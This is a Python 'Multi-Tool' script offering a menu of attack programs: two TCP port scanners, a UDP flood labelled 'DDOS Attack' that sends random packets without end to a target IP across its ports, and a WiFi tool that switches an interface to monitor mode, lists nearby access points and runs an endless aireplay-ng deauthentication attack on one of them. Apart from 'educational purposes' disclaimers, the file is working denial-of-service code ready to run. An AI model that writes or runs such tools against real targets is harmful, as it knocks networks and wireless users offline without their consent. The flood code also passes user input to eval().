import os
import time
import socket
import scapy.all as scapy
import random
import pyfiglet
from colorama import Fore, Style, init
from datetime import datetime

# Initialize colorama
init()

# Add ASCII art or any necessary information
print("Welcome to the Multi-Tool!")
print("Developed by iamgeo1")

# Make a variable which is in the format opt(number) = -1 if needed
opt0 = -1
opt1 = -1
opt2 = -1
opt4 = -1

# Define your programs
def program0():
    # Port Scanner Program
    print("Made by iamgeo1")

    # Create a banner
    banner = pyfiglet.figlet_format("Port Scanner")

    # ANSI escape code for blue text
    blue_text = "\033[34m"

    # ANSI escape code to reset text formatting
    reset_text = "\033[0m"

    # Print the banner in blue
    print(blue_text + banner + reset_text)

    # Get the target IP and port range from the user
    target_ip = input("Target IP: ")
    start_port = int(input("Start Port: "))
    end_port = int(input("End Port: "))

    def port_scanner(ip, start_port, end_port):
        print(f"Scanning IP: {ip} from port {start_port} to {end_port}...\n")

        # Track the start time
        start_time = datetime.now()

        for port in range(start_port, end_port + 1):
            try:
                # Create a new socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # Set a timeout for the connection attempt
                sock.settimeout(1)
                # Attempt to connect to the target IP and port
                result = sock.connect_ex((ip, port))
                # If the result is 0, the port is open
                if result == 0:
                    print(f"Port {port}: OPEN")
                # Close the socket
                sock.close()
            except Exception as e:
                print(f"Error scanning port {port}: {e}")
                continue

        # Track the end time and calculate duration
        end_time = datetime.now()
        total_time = end_time - start_time
        print(f"\nScanning completed in: {total_time}")

def program1():
    # DDOS Attack Program
    def display_banner():
        banner =  "██████╗ ██████╗  ██████╗ ███████╗       █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗\n"
        banner += "██╔══██╗██╔══██╗██╔═══██╗██╔════╝      ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝\n"
        banner += "██║  ██║██║  ██║██║   ██║███████╗█████╗███████║   ██║      ██║   ███████║██║     █████╔╝\n"
        banner += "██║  ██║██║  ██║██║   ██║╚════██║╚════╝██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗\n"
        banner += "██████╔╝██████╔╝╚██████╔╝███████║      ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗\n"
        banner += "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\n"
        print(banner)

    display_banner()

    # Terminal header settings and information
    os.system('color 0A')
    print("Developer  :       iamgeo1")
    print("Created Date:   2024-07-09")
    print('Project     :   DDOS-Attack')
    print('Purpose     :   A simple DDOS-Attack tool to test your network security')
    print('Caution     :   This tool is only for educational purposes. Do not use this for illegal purposes.')
    print()

    # Date and Time Declaration and Initialization
    mydate = time.strftime('%Y-%m-%d')
    mytime = time.strftime('%H-%M')

    # Lets define sock and bytes for our attack
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    # Type your ip and port number (find IP address using nslookup or any online website)
    ip = input("IP Target : ")
    port = eval(input("Port       : "))

    # Lets start the attack
    print("Thank you for using the KARTHIK-LAL (DDOS-ATTACK-TOOL).")
    print("Starting the attack on ", ip, " at port ", port, "...")

    time.sleep(5)
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print("Sent %s packet to %s through port:%s" % (sent, ip, port))
        if port == 65534:
            port = 1

    # End of the script
    os.system("cls")
    input("Press Enter to exit...")

def program2():
    # Port Scanner with Colorama
    ascii_art = """ ____   ___  ____ _____   ____   ____    _    _   _ _   
|  _ \ / _ \|  _ \_   _| / ___| / ___|  / \  | \ | | \ | | ____|  _ \ 
| |_) | | | | |_) || |   \___ \| |     / _ \ |  \| |  \| |  _| | |_) |
|  __/| |_| |  _ < | |    ___) | |___ / ___ \| |\  | |\  | |___|  _ < 
|_|    \___/|_| \_\|_|   |____/ \____/_/   \_\_| \_|_| \_|_____|_| \_\

"""
    print(Fore.CYAN + ascii_art + Style.RESET_ALL)  # Cyan text

    print(Fore.BLUE + "Made by iamgeo1")
    print(Fore.BLUE + "Only use this for security reasons")
    print(Fore.BLUE + "For any advice, add @geo1ge on snapchat.com")

    target_ip = input(Fore.RED + "Target IP:")
    start_port = int(input(Fore.YELLOW + "Start Port:"))
    end_port = int(input(Fore.YELLOW + "End Port:"))

    def port_scanner(target_ip, start_port, end_port):
        for port in range(start_port, end_port + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                print(f"Port {port} is open")
            else:
                print(f"Port {port} is closed")
            sock.close()

    port_scanner(target_ip, start_port, end_port)

def program4():
    # DoS Attack Tool (option 4)
    import subprocess  
    import re
    import csv
    import os
    import time
    import shutil
    from datetime import datetime

    active_wireless_networks = []

    def check_for_essid(essid, lst):
        check_status = True
        if len(lst) == 0:
            return check_status
        for item in lst:
            if essid in item["ESSID"]:
                check_status = False
        return check_status

    print(r""" ___    _    __  __  ____ _____
|_ _|  / \  |  \/  |/ ___| ____/ _ \/ |
 | |  / _ \ | |\/| | |  _|  _|| | | | |
 | | / ___ \| |  | | |_| | |__| |_| | |
|___/_/   \_\_|  |_|\____|_____\___/|_|""")

    print("\n****************************************************************")
    print("\n* Copyright by iamgeo1                                          *")
    print("\n*****************************************************************")

    if not 'SUDO_UID' in os.environ.keys():
        print("Try running this program with sudo.")
        exit()

    for file_name in os.listdir():
        if ".csv" in file_name:
            print("There shouldn't be any .csv files in your directory.")
            directory = os.getcwd()
            try:
                os.mkdir(directory + "/backup/")
            except:
                print("Backup folder exists.")
            timestamp = datetime.now()
            shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

    wlan_pattern = re.compile("^wlan[0-9]+")
    check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
    if len(check_wifi_result) == 0:
        print("Please connect a WiFi controller and try again.")
        exit()

    print("The following WiFi interfaces are available:")
    for index, item in enumerate(check_wifi_result):
        print(f"{index} - {item}")

    wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
    try:
        wifi_interface_choice = check_wifi_result[int(wifi_interface_choice)]
    except:
        print("Not a valid option, please try again.")
        exit()

    subprocess.run(["ip", "link", "set", wifi_interface_choice, "down"])
    subprocess.run(["iwconfig", wifi_interface_choice, "mode", "monitor"])
    subprocess.run(["ip", "link", "set", wifi_interface_choice, "up"])

    discover_access_points = subprocess.Popen(["airodump-ng", wifi_interface_choice, "--write", "cap", "--output-format", "csv"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    try:
        while True:
            subprocess.call("clear", shell=True)
            for file_name in os.listdir():
                if ".csv" in file_name:
                    with open(file_name, newline="") as csvfile:
                        csvreader = csv.DictReader(csvfile)
                        for row in csvreader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)
            print("Scanning. Press Ctrl+C when you want to select which access point to attack.\n")
            print("No |\tBSSID              |\tChannel|\tESSID")
            print("___|\t___________________|\t_______|\t__________________")
            for index, item in enumerate(active_wireless_networks):
                print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nReady to make choice.")

    for index, item in enumerate(active_wireless_networks):
        print(f"{index} - {item}")

    ap_choice = input("Please select a choice from the list: ")
    try:
        ap_choice = active_wireless_networks[int(ap_choice)]
    except:
        print("Not a valid option, please try again.")
        exit()

    subprocess.run(["airmon-ng", "start", wifi_interface_choice, ap_choice["channel"].strip()])

    print("Launching deauthentication attack...")
    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", ap_choice["BSSID"], wifi_interface_choice])

# Main menu
def main_menu():
    while True:
        print("\n--- Main Menu ---")
        print("0 - Port Scanner")
        print("1 - DDOS Attack")
        print("2 - Port Scanner (Colorama)")
        print("4 - DoS Attack Tool")
        print("5 - Exit")

        choice = input("Enter your choice: ")

        if choice == "0":
            program0()
        elif choice == "1":
            program1()
        elif choice == "2":
            program2()
        elif choice == "4":
            program4()
        elif choice == "5":
            print("Exiting the program.")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main_menu()

